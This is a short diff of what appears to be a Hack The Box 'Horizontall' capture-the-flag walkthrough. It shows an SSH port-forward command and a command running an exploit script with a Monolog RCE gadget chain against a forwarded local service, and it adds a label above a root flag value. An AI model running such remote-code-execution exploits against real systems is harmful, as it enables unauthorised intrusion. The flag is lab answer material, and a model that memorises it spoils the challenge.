@@ -57,4 +57,5 @@ ssh -i -L 8000:127.0.0.1:8000 strapi@horizontall.htb
 
 python3 exploit.py http://localhost:8000 Monolog/RCE1 "whoami"
 
+root.txt:
 edc59c5f477d7cd33eb52024e0146eb0
